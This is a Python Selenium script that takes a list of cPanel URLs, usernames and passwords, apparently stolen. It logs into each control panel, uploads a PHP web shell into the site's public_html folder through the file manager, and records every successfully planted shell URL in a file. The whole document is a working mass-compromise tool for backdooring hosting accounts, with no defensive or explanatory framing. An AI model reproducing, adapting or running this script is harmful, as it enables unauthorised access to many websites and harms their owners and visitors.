from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

sh_name = raw_input("Enter Shell Name >> ")
cd = raw_input("Enter Your Shell dir >> ") #C:\Users\pc\Desktop\k02XMDD.php
cps_file = raw_input("Enter Your Cpanels List (cp_url|user|pass) >> ")
file =  open(cps_file,"r")
driver = webdriver.Chrome("C:\Selenium\Chrome/chromedriver.exe")
for line in file:
	line = line.strip()
	url, user, passwd = line.split("|")
	#Start The Script
	try:
		link = url+'/login/?user='+user+'&pass='+passwd
		driver.get(link)
		time.sleep(3)
		if "post_login=" in str(driver.current_url):
			time.sleep(2)
			domain = driver.find_element_by_xpath('//span[@id="txtDomainName"]').text
			print("[+] logged in >> "+line)
			link = str(driver.current_url).split("index.html")[0]
			driver.get(link+"/filemanager/upload-ajax.html?file=&fileop=&dir=/home/"+user+"/public_html&dirop=&charset=&file_charset=&baseurl=&basedir=")
			time.sleep(2)
			driver.find_element_by_id("uploader_file_input").send_keys(cd)
			time.sleep(7)
			prog_elem = driver.find_element_by_id("progress1").get_attribute("class")
			if str(prog_elem) == "progress-bar progress-bar-success":
				shell_url = "https://"+domain+"/"+sh_name
				print("[+] Uploaded sell successfully on >> "+line+"\n")
				shells = open("shells.txt","a+")
				shells.write(shell_url+"\n")
				shells.close()
			else:
				print("[-] failed uploading shell on "+line+"\n")
		else:
			print("[+] invalid login >> "+line+"\n")
			pass
	except:
		print("un expected error")
